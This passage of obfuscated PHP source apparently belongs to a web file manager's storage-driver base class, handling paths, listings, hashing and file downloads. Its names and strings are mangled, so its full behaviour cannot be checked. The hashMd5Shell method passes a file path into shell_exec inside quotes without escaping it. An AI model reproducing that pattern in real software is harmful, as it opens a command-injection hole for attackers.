$šãë“¿ú[70] . $âåí¼–¬ . $šãë“¿ú[71] . $‘¶ÇØõ] = $ê²³€•¯; $¹¨¸Íãü[$âåí¼–¬ . $šãë“¿ú[70] . $¸ì‚üÑ¼ . $šãë“¿ú[71] . $‘¶ÇØõ] = $‘¶ÇØõ; return $‘¶ÇØõ; } public function getPathInner($ÃëÖ¤àÀ) { $šğ¶éîë = IO::init($ÃëÖ¤àÀ); return $šğ¶éîë->path; } public function getPathOuter($ĞıØòì) { $Úıå‚ =& $_SERVER[­á Ş³Ö]; $õÍ¿˜–è = strlen(trim($this->pathBase, $Úıå‚[8])); $ĞıØòì = substr(trim($ĞıØòì, $Úıå‚[8]), $õÍ¿˜–è); return $this->pathDriver . $Úıå‚[8] . ltrim($ĞıØòì, $Úıå‚[8]); } public function isParentOf($¤¸À¾Û‘, $¨Å¢şÄØ) { $ßì¡° =& $_SERVER[­á Ş³Ö]; $¤¸À¾Û‘ = rtrim(strtolower($¤¸À¾Û‘), $ßì¡°[8]) . $ßì¡°[8]; $¨Å¢şÄØ = rtrim(strtolower($¨Å¢şÄØ), $ßì¡°[8]) . $ßì¡°[8]; $œÛ†Ûƒ = strpos($¨Å¢şÄØ, $¤¸À¾Û‘) === 0; return $œÛ†Ûƒ; } public function getType() { $¿ôÜ×À =& $_SERVER[­á Ş³Ö]; $Ü÷­ê¼Ò = str_replace($¿ôÜ×À[74], $¿ôÜ×À[12], get_class($this)); return strtolower($Ü÷­ê¼Ò); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($¡ÜëÛèü, $€æÍ¿Ø) { $Î×§øù¾ =& $_SERVER[­á Ş³Ö]; $ñ“¬Ã‡ñ = rtrim($¡ÜëÛèü, $Î×§øù¾[8]) . $Î×§øù¾[8] . $€æÍ¿Ø; $¦³º† = $this->exist($ñ“¬Ã‡ñ); return $¦³º† ? $ñ“¬Ã‡ñ : !1; } public function setModifyTime($×’ïÓ’, $ ä°ìÁ = '') { } public function renameObject($¢Õê§Å‡, $½„Áâ£) { $áİ©Şä¿ = $½„Áâ£; $¢Õê§Å‡ = $this->getPathOuter($¢Õê§Å‡); $½„Áâ£ = $this->pathFather($¢Õê§Å‡) . $½„Áâ£; $¨ì†üÍÃ = IO::copy($¢Õê§Å‡, $this->pathFather($¢Õê§Å‡), REPEAT_RENAME_FOLDER, $áİ©Şä¿); if ($¨ì†üÍÃ) { IO::remove($¢Õê§Å‡); } return $¨ì†üÍÃ ? $½„Áâ£ : !1; } public function tempFile($¬Ë¼¨“ˆ = '', $²Ó«³È£ = '') { if (!$¬Ë¼¨“ˆ) { $¬Ë¼¨“ˆ = rand_string(15); } $òûÛÉ´Î = TEMP_FILES . rand_string(15) . $_SERVER[­á Ş³Ö][8]; @mkdir($òûÛÉ´Î, DEFAULT_PERRMISSIONS, !0); $ÄøÀÇ±ô = $òûÛÉ´Î . $¬Ë¼¨“ˆ; @touch($ÄøÀÇ±ô); if ($²Ó«³È£) { file_put_contents($ÄøÀÇ±ô, $²Ó«³È£); } return $ÄøÀÇ±ô; } public function tempFileRemve($Ó…İû¹) { @unlink($Ó…İû¹); @rmdir($this->pathFather($Ó…İû¹)); } public function mkfile($Ó‚Îá¨„, $Úéí¼¦¡ = '', $£à½»Ù¢ = REPEAT_RENAME) { } public function mkdir($ÂÊîİ‚ê, $ãüİïÍ¿ = REPEAT_SKIP) { } public function delFile($‚”µóÜì) { } public function delFolder($Æ¡ñ×¤…) { } public function copyFile($½ªŞÄÀÜ, $¨…²à¿³) { } public function moveFile($Ù±ßØìÎ, $¸ª©¨×Î) { } public function remove($´½çÊä‰) { if ($this->isFile($´½çÊä‰)) { return $this->delFile($´½çÊä‰); } return $this->delFolder($´½çÊä‰); } public function rename($›¨¹¡ó, $øÆ¸Ğ‚) { } public function exist($¾Ò×ò°¢) { } public function findByHash($Ğáô‡±Â = '', $‘¹Û÷×ì = '') { return !1; } public function isFile($‰×†ëˆó) { } public function isFolder($¡æ‚¿£©) { } public function size($£ ÒÖ“‰) { } public function info($Êàµ¤è™) { } public function infoSimple($´èíÂ„ò) { return $this->info($´èíÂ„ò); } public function infoAuth($¬¾ïµ”È) { return $this->info($¬¾ïµ”È); } public function infoFull($áÕÀ¤Ëù) { return $this->info($áÕÀ¤Ëù); } public function infoWithChildren($»øê™™) { $ìØÊõÀô =& $_SERVER[­á Ş³Ö]; static $¶×ÑĞÈ° = array(); if (isset($¶×ÑĞÈ°[$»øê™™])) { return $¶×ÑĞÈ°[$»øê™™]; } $àš”áä· = $this->info($»øê™™); if ($àš”áä· && $àš”áä·[$ìØÊõÀô[33]] == $ìØÊõÀô[75]) { $È„÷Ó¢ = array($ìØÊõÀô[76] => 0, $ìØÊõÀô[77] => 0, $ìØÊõÀô[78] => 0); $this->infoChildren($»øê™™, $È„÷Ó¢); $àš”áä·[$ìØÊõÀô[76]] = $È„÷Ó¢[$ìØÊõÀô[76]]; $àš”áä·[$ìØÊõÀô[79]] = array($ìØÊõÀô[80] => $È„÷Ó¢[$ìØÊõÀô[77]], $ìØÊõÀô[81] => $È„÷Ó¢[$ìØÊõÀô[78]]); $¶×ÑĞÈ°[$»øê™™] = $àš”áä·; } return $àš”áä·; } public function listPath($¾ó×Îô´, $ˆñ¤¢¼ı = false) { } public function has($»®·ş‚Å, $šØÃ­ = false, $Å—Îá = false) { } public function canRead($êèó·ˆÈ) { } public function canWrite($âÁşº¹„) { } public function getContent($Ä¤µÌä¢) { } public function setContent($‚’³‰Ç, $©éœÚŞ° = '') { } protected function infoChildren($­ë¾€, &$ç‚´ó˜æ) { $¸Õ«üà’ =& $_SERVER[­á Ş³Ö]; check_abort_echo(); $Ù¯¢¿ñ = $this->listPath($­ë¾€, !0); $Ù¯¢¿ñ = array_merge($Ù¯¢¿ñ[$¸Õ«üà’[82]], $Ù¯¢¿ñ[$¸Õ«üà’[83]]); foreach ($Ù¯¢¿ñ as $Û”åÅÚÁ) { if ($Û”åÅÚÁ[$¸Õ«üà’[33]] == $¸Õ«üà’[75]) { $ç‚´ó˜æ[$¸Õ«üà’[78]]++; $õ­‚ôçŒ = $this->getPathInner($Û”åÅÚÁ[$¸Õ«üà’[84]]); $this->infoChildren($õ­‚ôçŒ, $ç‚´ó˜æ); } else { $ç‚´ó˜æ[$¸Õ«üà’[77]]++; $ç‚´ó˜æ[$¸Õ«üà’[76]] += $Û”åÅÚÁ[$¸Õ«üà’[76]]; } } } public function fileSubstr($€ˆí¤¨Ó, $ŞäªÑ—º, $Š‚ºÍ£Æ) { } public function listAll($ÕéÉ›Õ) { } public function listAllMake($·ú”œ¹µ, &$¢É‡Š‚É) { $½ıô£—÷ =& $_SERVER[­á Ş³Ö]; check_abort_echo(); $Šå…ËÚê = $this->listPath($·ú”œ¹µ, !0); if (!$Šå…ËÚê) { return; } $Ñ¿±¥ñô = array_merge($Šå…ËÚê[$½ıô£—÷[82]], $Šå…ËÚê[$½ıô£—÷[83]]); foreach ($Ñ¿±¥ñô as $«ü½ªà¸) { $Ç±¡ïŸ“ = $«ü½ªà¸[$½ıô£—÷[33]] == $½ıô£—÷[75]; $™É‘ÃÆÔ = array($½ıô£—÷[84] => $«ü½ªà¸[$½ıô£—÷[84]], $½ıô£—÷[75] => $Ç±¡ïŸ“); if (isset($«ü½ªà¸[$½ıô£—÷[76]])) { $™É‘ÃÆÔ[$½ıô£—÷[76]] = $«ü½ªà¸[$½ıô£—÷[76]]; } if (isset($«ü½ªà¸[$½ıô£—÷[85]])) { $™É‘ÃÆÔ[$½ıô£—÷[85]] = $«ü½ªà¸[$½ıô£—÷[85]]; } if (!$Ç±¡ïŸ“) { $¢É‡Š‚É[] = $™É‘ÃÆÔ; continue; } $¢É‡Š‚É[] = $™É‘ÃÆÔ; $„ÔÁÂ®Š = $«ü½ªà¸[$½ıô£—÷[84]]; $¬—ÏÏ¶ = $this->pathDriver; if (substr($«ü½ªà¸[$½ıô£—÷[84]], 0, strlen($¬—ÏÏ¶)) == $¬—ÏÏ¶) { $„ÔÁÂ®Š = substr($„ÔÁÂ®Š, strlen($¬—ÏÏ¶)); } $this->listAllMake($„ÔÁÂ®Š, $¢É‡Š‚É); } } public function listAllSimple($¹¸ßÁ§ã, $´·õ©’Ê = false) { $øó­ä¾Á = $this->listAll($¹¸ßÁ§ã); return $this->listAllSimpleMake($øó­ä¾Á, $this->getPathOuter($¹¸ßÁ§ã), $´·õ©’Ê); } public function listAllSimpleMake($„àÁñ±Î, $¾•ì’½ú, $á¯‡¹¯‚) { $¶ä¨çÚø =& $_SERVER[­á Ş³Ö]; $ÚßëÌÙ¦ = array(); $¾•ì’½ú = rtrim(get_path_father($¾•ì’½ú), $¶ä¨çÚø[8]) . $¶ä¨çÚø[8]; foreach ($„àÁñ±Î as $´¢ğñ´ò) { $‚ÕÎçÕ¨ = array($¶ä¨çÚø[84] => $´¢ğñ´ò[$¶ä¨çÚø[84]], $¶ä¨çÚø[86] => $´¢ğñ´ò[$¶ä¨çÚø[84]], $¶ä¨çÚø[75] => $´¢ğñ´ò[$¶ä¨çÚø[75]]); if (isset($´¢ğñ´ò[$¶ä¨çÚø[76]]) && !$´¢ğñ´ò[$¶ä¨çÚø[75]]) { $‚ÕÎçÕ¨[$¶ä¨çÚø[76]] = $´¢ğñ´ò[$¶ä¨çÚø[76]]; } if (isset($´¢ğñ´ò[$¶ä¨çÚø[85]])) { $‚ÕÎçÕ¨[$¶ä¨çÚø[85]] = $´¢ğñ´ò[$¶ä¨çÚø[85]]; } if (is_array($´¢ğñ´ò[$¶ä¨çÚø[87]])) { $‚ÕÎçÕ¨[$¶ä¨çÚø[86]] = $´¢ğñ´ò[$¶ä¨çÚø[87]][$¶ä¨çÚø[84]]; $‚ÕÎçÕ¨[$¶ä¨çÚø[76]] = $´¢ğñ´ò[$¶ä¨çÚø[87]][$¶ä¨çÚø[76]]; $‚ÕÎçÕ¨[$¶ä¨çÚø[85]] = $´¢ğñ´ò[$¶ä¨çÚø[87]][$¶ä¨çÚø[85]]; } else { if (substr($´¢ğñ´ò[$¶ä¨çÚø[84]], 0, strlen($¾•ì’½ú)) == $¾•ì’½ú) { $‚ÕÎçÕ¨[$¶ä¨çÚø[84]] = substr($´¢ğñ´ò[$¶ä¨çÚø[84]], strlen($¾•ì’½ú)); } } $½Ú°¢™ = $´¢ğñ´ò[$¶ä¨çÚø[75]] ? $¶ä¨çÚø[8] : $¶ä¨çÚø[12]; $‚ÕÎçÕ¨[$¶ä¨çÚø[86]] = rtrim($‚ÕÎçÕ¨[$¶ä¨çÚø[86]], $¶ä¨çÚø[8]) . $½Ú°¢™; $‚ÕÎçÕ¨[$¶ä¨çÚø[84]] = $¶ä¨çÚø[8] . trim($‚ÕÎçÕ¨[$¶ä¨çÚø[84]], $¶ä¨çÚø[8]) . $½Ú°¢™; if (!$á¯‡¹¯‚) { $ŒÛ¥ìÖï = explode($¶ä¨çÚø[8], trim($‚ÕÎçÕ¨[$¶ä¨çÚø[84]], $¶ä¨çÚø[8])); $‚ÕÎçÕ¨[$¶ä¨çÚø[84]] = $¶ä¨çÚø[8] . implode($¶ä¨çÚø[8], array_slice($ŒÛ¥ìÖï, 1)) . $½Ú°¢™; } $ÚßëÌÙ¦[] = $‚ÕÎçÕ¨; } return array_sort_by($ÚßëÌÙ¦, $¶ä¨çÚø[84]); } public function upload($€…šÅœ, $î­±ÉÄÃ, $öÅ•˜Ç = false, $²­‹ê·í = REPEAT_REPLACE) { } public function uploadFileByID($ñ»…÷óŠ, $ç³åÅå€, $Ã×İŞí€) { } public function uploadFileByPath($³‰÷×Öö, $•ŠÒğÙ¢, $¹—”Ë´÷ = array()) { } public function isUploadServer() { $ÆçÃ”Ú =& $_SERVER[­á Ş³Ö]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ÆçÃ”Ú[88]) { return !0; } return $GLOBALS[$ÆçÃ”Ú[6]][$ÆçÃ”Ú[89]][$ÆçÃ”Ú[90]]; } public function isFileOutServer() { $»Õ½ø²Œ =& $_SERVER[­á Ş³Ö]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $»Õ½ø²Œ[88]) { return !0; } return $GLOBALS[$»Õ½ø²Œ[6]][$»Õ½ø²Œ[89]][$»Õ½ø²Œ[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ò«•ı©‚) { $¯›§«‘Ó =& $_SERVER[­á Ş³Ö]; if (!$this->isCdnHost()) { return $ò«•ı©‚; } return str_replace(trim(get_url_root($ò«•ı©‚), $¯›§«‘Ó[8]), trim($this->cdnHost, $¯›§«‘Ó[8]), $ò«•ı©‚); } public function uploadLink($¥Ãœ€•è, $ÊâÁáù = 0) { $èê‘ïĞ‰ =& $_SERVER[­á Ş³Ö]; if ($this->isUploadServer()) { return; } $¼©›Šş‘ = $this->getType(); if (!in_array($¼©›Šş‘, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ñ«£°Ö = 1024 * 1024 * 10; $®¯ğïÃ¸ = $ÊâÁáù <= $Ñ«£°Ö ? $èê‘ïĞ‰[92] : $èê‘ïĞ‰[93]; $¢»€­âò = (!$ÊâÁáù ? 1 : ceil($ÊâÁáù / pow(1024, 3))) * 3600 * 4; $Ûèî¬çú = $this->{$®¯ğïÃ¸}($¥Ãœ€•è, $¢»€­âò); if ($Ûèî¬çú) { $Ûèî¬çú[$èê‘ïĞ‰[94]] = $¥Ãœ€•è; $Ûèî¬çú[$èê‘ïĞ‰[95]] = $¼©›Šş‘; } return $Ûèî¬çú; } public function uploadFormData($Ÿ³±ÊŸñ, $±É¤ºªÄ = 3600) { } public function multiUploadFormData($îğŸº, $½çˆä£ü = 3600) { } public function download($ ŸÌÒ÷¶, $ĞÊ‚ª€) { } public function ext($µÏ¿°£Á) { $°ûò‡¦Ò =& $_SERVER[­á Ş³Ö]; if (strpos($µÏ¿°£Á, $°ûò‡¦Ò[8]) === -1) { $Ì´¾ó– = $µÏ¿°£Á; } else { $Ì´¾ó– = $this->pathThis($µÏ¿°£Á); } $Ù÷èªÊ = $°ûò‡¦Ò[12]; if (strstr($Ì´¾ó–, $°ûò‡¦Ò[10])) { $Ù÷èªÊ = substr($Ì´¾ó–, strrpos($Ì´¾ó–, $°ûò‡¦Ò[10]) + 1); $Ù÷èªÊ = strtolower($Ù÷èªÊ); } if (strlen($Ù÷èªÊ) > 3 && preg_match($°ûò‡¦Ò[96], $Ù÷èªÊ, $ò˜€²°Ñ)) { $Ù÷èªÊ = $°ûò‡¦Ò[12]; } return $Ù÷èªÊ; } public function pathThis($ï‚óİƒ¼) { $çß‘¬‘ =& $_SERVER[­á Ş³Ö]; $ï‚óİƒ¼ = str_replace($çß‘¬‘[97], $çß‘¬‘[8], rtrim($ï‚óİƒ¼, $çß‘¬‘[8])); $œê¾‚Îú = strrpos($ï‚óİƒ¼, $çß‘¬‘[8]); if ($œê¾‚Îú === !1) { return $ï‚óİƒ¼; } return substr($ï‚óİƒ¼, $œê¾‚Îú + 1); } public function pathFather($ÀĞ”å”„) { $Åµ˜éƒ² =& $_SERVER[­á Ş³Ö]; $ÀĞ”å”„ = str_replace($Åµ˜éƒ²[97], $Åµ˜éƒ²[8], rtrim($ÀĞ”å”„, $Åµ˜éƒ²[8])); $Õ´¥¢Ë = strrpos($ÀĞ”å”„, $Åµ˜éƒ²[8]); if ($Õ´¥¢Ë === !1) { return $Åµ˜éƒ²[12]; } return substr($ÀĞ”å”„, 0, $Õ´¥¢Ë + 1); } public function hashSimple($Á™€Ú­º) { $ì„”Ï”Ò =& $_SERVER[­á Ş³Ö]; if (!$Á™€Ú­º) { return md5($ì„”Ï”Ò[12]); } $Õı¢«¼À = $this->size($Á™€Ú­º); $×½°¤Š = 200; $üÓëÓƒƒ = 50; if ($Õı¢«¼À <= $×½°¤Š * $üÓëÓƒƒ) { return $this->hashMd5($Á™€Ú­º) . $Õı¢«¼À; } $İº¦Î»€ = intval($Õı¢«¼À / $üÓëÓƒƒ); $”³öóê¥ = $ì„”Ï”Ò[12]; for ($€È‘ï‘ò = 0; $€È‘ï‘ò < $üÓëÓƒƒ; $€È‘ï‘ò++) { $”³öóê¥ .= $this->fileSubstr($Á™€Ú­º, $İº¦Î»€ * $€È‘ï‘ò, $×½°¤Š); } $”³öóê¥ .= $this->fileSubstr($Á™€Ú­º, $Õı¢«¼À - $×½°¤Š, $×½°¤Š); return md5($”³öóê¥) . $Õı¢«¼À; } public static $md5Cache = array(); public function hashMd5($ÚğÓ¶ñª) { if (!$ÚğÓ¶ñª) { return md5($_SERVER[­á Ş³Ö][12]); } $ÚğÓ¶ñª = $this->iconvSystem($ÚğÓ¶ñª); if (isset(self::$md5Cache[$ÚğÓ¶ñª])) { return self::$md5Cache[$ÚğÓ¶ñª]; } self::$md5Cache[$ÚğÓ¶ñª] = $this->hashMd5Shell($ÚğÓ¶ñª); if (!self::$md5Cache[$ÚğÓ¶ñª]) { self::$md5Cache[$ÚğÓ¶ñª] = @md5_file($ÚğÓ¶ñª); } return self::$md5Cache[$ÚğÓ¶ñª]; } private function hashMd5Shell($ÛÔšø”…) { $¡¹´ÍÄ‚ =& $_SERVER[­á Ş³Ö]; if (!$ÛÔšø”…) { return md5($¡¹´ÍÄ‚[12]); } if (!function_exists($¡¹´ÍÄ‚[98])) { return !1; } $åìûÂõÉ = array($¡¹´ÍÄ‚[99], $¡¹´ÍÄ‚[100]); $¡—üª = Cache::get($¡¹´ÍÄ‚[101]); if (!$¡—üª) { $ÙÅö‰İ = BASIC_PATH . $¡¹´ÍÄ‚[102]; $âê¹òÜ = md5_file($ÙÅö‰İ); $¡—üª = $¡¹´ÍÄ‚[103]; foreach ($åìûÂõÉ as $îÁó±¯ø) { $ƒºÄêæâ = shell_exec($îÁó±¯ø . "\40\x22{$ÙÅö‰İ}\42"); if ($ƒºÄêæâ && substr(trim($ƒºÄêæâ), 0, 32) == $âê¹òÜ) { $¡—üª = $îÁó±¯ø; break; } } Cache::set($¡¹´ÍÄ‚[101], $¡—üª, 3600); } if ($¡—üª == $¡¹´ÍÄ‚[103]) { return !1; } $ƒºÄêæâ = shell_exec($¡—üª . "\x20\42{$ÛÔšø”…}\42"); $ƒºÄêæâ = str_replace($¡¹´ÍÄ‚[104], $¡¹´ÍÄ‚[12], $ƒºÄêæâ); return substr($ƒºÄêæâ, 0, 32); } public function link($‡‘”Û¨Ø) { return $‡‘”Û¨Ø; } public function fileOut($‹ôü²¿Ê, $íØ›ìğš = false, $¦©şÙç³ = false, $çœ…¡ÇÃ = '') { $ãÚ¬œ‘Ô =& $_SERVER[­á Ş³Ö]; $this->cacheMethod(null, null); if (!$‹ôü²¿Ê || !$this->exist($‹ôü²¿Ê)) { show_json(LNG($ãÚ¬œ‘Ô[105]), !1, $¦©şÙç³); } $ı±ùŠ«ñ = $this->getType() == $ãÚ¬œ‘Ô[106]; $’àâˆÇı = $GLOBALS[$ãÚ¬œ‘Ô[6]][$ãÚ¬œ‘Ô[89]][$ãÚ¬œ‘Ô[107]][$ãÚ¬œ‘Ô[108]]; $âÊô©ıú = (double) $GLOBALS[$ãÚ¬œ‘Ô[6]][$ãÚ¬œ‘Ô[89]][$ãÚ¬œ‘Ô[107]][$ãÚ¬œ‘Ô[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÒÃâ›ÒĞ = $this->infoFull($‹ôü²¿Ê); $š‘Ë Èõ = $ÒÃâ›ÒĞ[$ãÚ¬œ‘Ô[76]]; $†ïà‹Ò = gmdate($ãÚ¬œ‘Ô[110], $ÒÃâ›ÒĞ[$ãÚ¬œ‘Ô[85]]); $¸°Š¬è¾ = $¦©şÙç³ ? $¦©şÙç³ : $this->iconvApp($ÒÃâ›ÒĞ[$ãÚ¬œ‘Ô[32]]); $É±­·»à = 0; $–ãÜ¢ˆ = $š‘Ë Èõ - 1; $áøìî‚ = $this->ext($¸°Š¬è¾); if (in_array($áøìî‚, array($ãÚ¬œ‘Ô[111], $ãÚ¬œ‘Ô[112], $ãÚ¬œ‘Ô[113], $ãÚ¬œ‘Ô[114]))) { $áøìî‚ = $ãÚ¬œ‘Ô[115]; } if (in_array($áøìî‚, array($ãÚ¬œ‘Ô[116]))) { $áøìî‚ = $ãÚ¬œ‘Ô[117]; } if (!$çœ…¡ÇÃ) { $çœ…¡ÇÃ = md5($†ïà‹Ò . $this->hashSimple($‹ôü²¿Ê)); } $çœ…¡ÇÃ = $ãÚ¬œ‘Ô[118] . $çœ…¡ÇÃ . $ãÚ¬œ‘Ô[118]; $”äò° = get_file_mime($áøìî‚); $îøº±„“ = !0; $îøº±„“ = isset($_GET[$ãÚ¬œ‘Ô[119]]) ? !1 : !0; if ($íØ›ìğš === !1 && !mime_support($”äò°)) { $”äò° = $ãÚ¬œ‘Ô[120]; } header($ãÚ¬œ‘Ô[121]); header($ãÚ¬œ‘Ô[122] . $”äò°); $£ĞçØù¥ = rawurlencode($¸°Š¬è¾); $£ĞçØù¥ = $ãÚ¬œ‘Ô[118] . $£ĞçØù¥ . $ãÚ¬œ‘Ô[123] . $£ĞçØù¥; if ($íØ›ìğš) { header($ãÚ¬œ‘Ô[124]); header($ãÚ¬œ‘Ô[125] . $£ĞçØù¥); } else { if ($îøº±„“) { header($ãÚ¬œ‘Ô[126] . $£ĞçØù¥); } } header($ãÚ¬œ‘Ô[127] . gmdate($ãÚ¬œ‘Ô[110], time() + 3600 * 24 * 30) . $ãÚ¬œ‘Ô[128]); header($ãÚ¬œ‘Ô[129]); header($ãÚ¬œ‘Ô[130]); header($ãÚ¬œ‘Ô[131]); if (isset($_SERVER[$ãÚ¬œ‘Ô[132]]) && strtotime($_SERVER[$ãÚ¬œ‘Ô[132]]) == $ÒÃâ›ÒĞ[$ãÚ¬œ‘Ô[85]]) { header($ãÚ¬œ‘Ô[133], !0, 304); die; } if (isset($_SERVER[$ãÚ¬œ‘Ô[134]]) && $_SERVER[$ãÚ¬œ‘Ô[134]] == $çœ…¡ÇÃ) { header($ãÚ¬œ‘Ô[135] . $çœ…¡ÇÃ, !0, 304); die; } header($ãÚ¬œ‘Ô[135] . $çœ…¡ÇÃ); header($ãÚ¬œ‘Ô[136] . $†ïà‹Ò . $ãÚ¬œ‘Ô[128]); header($ãÚ¬œ‘Ô[137] . $¸°Š¬è¾); header($ãÚ¬œ‘Ô[138]); header($ãÚ¬œ‘Ô[139] . $š‘Ë Èõ); header($ãÚ¬œ‘Ô[140]); if (!$íØ›ìğš && $áøìî‚ == $ãÚ¬œ‘Ô[141]) { if ($š‘Ë Èõ > 1024 * 1024 * 5) { die; } $¬ë´ Ÿ£ = $this->getContent($‹ôü²¿Ê); $¬ë´ Ÿ£ = Html::clearSVG($¬ë´ Ÿ£); header($ãÚ¬œ‘Ô[142] . strlen($¬ë´ Ÿ£)); echo $¬ë´ Ÿ£; die; } $Ñ˜½çóû = strtolower($_SERVER[$ãÚ¬œ‘Ô[143]]); if ($ı±ùŠ«ñ && $Ñ˜½çóû && $’àâˆÇı) { if (strstr($Ñ˜½çóû, $ãÚ¬œ‘Ô[144])) { header($ãÚ¬œ‘Ô[145] . $‹ôü²¿Ê); } else { if (strstr($Ñ˜½çóû, $ãÚ¬œ‘Ô[146])) { header($ãÚ¬œ‘Ô[147] . $‹ôü²¿Ê); } else { if (strstr($Ñ˜½çóû, $ãÚ¬œ‘Ô[148])) { header($ãÚ¬œ‘Ô[149] . $‹ôü²¿Ê); } } } if ($âÊô©ıú) { header($ãÚ¬œ‘Ô[150] . $âÊô©ıú); } return; } if (isset($_SERVER[$ãÚ¬œ‘Ô[151]])) { if (preg_match($ãÚ¬œ‘Ô[152], $_SERVER[$ãÚ¬œ‘Ô[151]], $ÅšøÄ)) { $É±­·»à = intval($ÅšøÄ[1]); $É±­·»à = $É±­·»à <= 0 ? 0 : ($É±­·»à >= $–ãÜ¢ˆ ? $–ãÜ¢ˆ : $É±­·»à); if (!empty($ÅšøÄ[2])) { $‚ğÇæí‰ = intval($ÅšøÄ[2]); $–ãÜ¢ˆ = $‚ğÇæí‰ < $É±­·»à ? $É±­·»à : ($‚ğÇæí‰ >= $–ãÜ¢ˆ ? $–ãÜ¢ˆ : $‚ğÇæí‰); } } header($ãÚ¬œ‘Ô[153]); header("\x43\157\x6e\164\x65\x6e\164\x2d\122\x61\x6e\x67\x65\x3a\x20\x62\171\164\x65\163\x20{$É±­·»à}\55{$–ãÜ¢ˆ}\x2f" . $š‘Ë Èõ); } else { header($ãÚ¬œ‘Ô[154]); } header($ãÚ¬œ‘Ô[155]); $êê¿Â§² = !0; if ($_SERVER[$ãÚ¬œ‘Ô[156]] == $ãÚ¬œ‘Ô[157] && $š‘Ë Èõ > 1204 * 1024 * 1024 * 2) { $êê¿Â§² = !1; } if ($êê¿Â§²) { header($ãÚ¬œ‘Ô[158] . ($–ãÜ¢ˆ - $É±­·»à + 1)); } if ($_SERVER[$ãÚ¬œ‘Ô[159]] == $ãÚ¬œ‘Ô[160]) { return; } $Ã‘´Ğºë = 1024 * 100; $æ³ÓÍš = 0; if ($âÊô©ıú) { $æ³ÓÍš = intval(1000 * 1000 * ($Ã‘´Ğºë / $âÊô©ıú)); } while ($É±­·»à <= $–ãÜ¢ˆ) { $©Ğï¸„¥ = timeFloat(); check_abort(); $§ç¥÷–Á = $–ãÜ¢ˆ - $É±­·»à + 1; if ($§ç¥÷–Á <= $Ã‘´Ğºë) { $Ã‘´Ğºë = $§ç¥÷–Á; } echo $this->fileSubstr($‹ôü²¿Ê, $É±­·»à, $Ã‘´Ğºë); $É±­·»à += $Ã‘´Ğºë; if ($Ã‘´Ğºë == $§ç¥÷–Á) { $É±­·»à = $–ãÜ¢ˆ + 1; } if ($æ³ÓÍš) { $¼Í°ÀÙ = intval(1000 * 1000 * (timeFloat() - $©Ğï¸„¥)); $‡ÛÀ»•õ = $æ³ÓÍš - $¼Í°ÀÙ; if ($‡ÛÀ»•õ > 5) { usleep($‡ÛÀ»•õ); } } } } public function fileOutServer($œ–¸®‘ç, $„µÍÛ—€ = false, $ã³”Àîª = false, $ƒÙšüŞş = '') { $this->fileOut($œ–¸®‘ç, $„µÍÛ—€, $ã³”Àîª, $ƒÙšüŞş); } public function fileOutLink($‰òƒÜ£•) { header($_SERVER[­á Ş³Ö][161] . $‰òƒÜ£•); die; } public function cacheMethod($õ‘‚ÇöŠ, $Ëêñ¿ú, $šÂ•Á = null) { $¥Á¬ã¨Ø =& $_SERVER[­á Ş³Ö]; static $ÌÜê›‘ = array(); $‘ˆ­ó™ß = $Ëêñ¿ú ? ltrim($this->getPathOuter($Ëêñ¿ú), $¥Á¬ã¨Ø[8]) : $¥Á¬ã¨Ø[12]; $›Äà©Ÿ = $¥Á¬ã¨Ø[162] . $õ‘‚ÇöŠ . $¥Á¬ã¨Ø[163] . rtrim($‘ˆ­ó™ß, $¥Á¬ã¨Ø[8]); if (is_null($õ‘‚ÇöŠ)) { $ÌÜê›‘ = array(); return; } if (is_null($Ëêñ¿ú)) { foreach ($ÌÜê›‘ as $›Äà©Ÿ => $Ë®•åÃ) { if (!strstr($›Äà©Ÿ, $¥Á¬ã¨Ø[162] . $õ‘‚ÇöŠ . $¥Á¬ã¨Ø[164])) { continue; } unset($ÌÜê›‘[$›Äà©Ÿ]); } return; } if (!is_null($šÂ•Á)) { $ÌÜê›‘[$›Äà©Ÿ] = $šÂ•Á; return; } $Üï“É”ñ = isset($ÌÜê›‘[$›Äà©Ÿ]) ? $ÌÜê›‘[$›Äà©Ÿ] : null; if (!is_null($Üï“É”ñ)) { return $Üï“É”ñ; } $Üï“É”ñ = $this->{$õ‘‚ÇöŠ}($Ëêñ¿ú); $ÌÜê›‘[$›Äà©Ÿ] = $Üï“É”ñ; return $Üï“É”ñ; } public function cacheMethodInfoSet($ÊÈÄŠî³, $·¿è‹ŸŞ, $–ÃŒö³ = false) { $¹‡¶®½ =& $_SERVER[­á Ş³Ö]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($¹‡¶®½[165], $ÊÈÄŠî³, $·¿è‹ŸŞ); $this->cacheMethod($¹‡¶®½[166], $ÊÈÄŠî³, $·¿è‹ŸŞ ? !1 : !0); if (is_array($–ÃŒö³)) { $this->cacheMethod($¹‡¶®½[167], $ÊÈÄŠî³, $–ÃŒö³); } } public function fileOutImage($¯“ñùš, $µ©³äóÀ = 250) { $–¡€¥£ =& $_SERVER[­á Ş³Ö]; set_timeout(); if (substr($¯“ñùš, 0, 4) == $–¡€¥£[148]) { $this->fileOutLink($¯“ñùš); } $„æ×æÚÜ = $this->info($¯“ñùš); $­‡ó¤«– = $„æ×æÚÜ[$–¡€¥£[32]]; $Ç´‰¯Ö² = !1; if (isset($GLOBALS[$–¡€¥£[168]]) && $GLOBALS[$–¡€¥£[168]][$–¡€¥£[84]] == $„æ×æÚÜ[$–¡€¥£[84]]) { $ú»é‰¹ˆ = $GLOBALS[$–¡€¥£[168]][$–¡€¥£[169]]; if (!$„æ×æÚÜ[$–¡€¥£[170]]) { $„æ×æÚÜ[$–¡€¥£[170]] = $GLOBALS[$–¡€¥£[168]]; } if (isset($ú»é‰¹ˆ[$–¡€¥£[171]])) { if ($ú»é‰¹ˆ[$–¡€¥£[171]] <= $µ©³äóÀ && $ú»é‰¹ˆ[$–¡€¥£[172]] <= $µ©³äóÀ) { $Ç´‰¯Ö² = !0; } } $­‡ó¤«– = $„æ×æÚÜ[$–¡€¥£[170]][$–¡€¥£[32]]; } if ($„æ×æÚÜ[$–¡€¥£[76]] <= 1024 * 50 || $Ç´‰¯Ö² || !function_exists($–¡€¥£[173]) || $„æ×æÚÜ[$–¡€¥£[174]] == 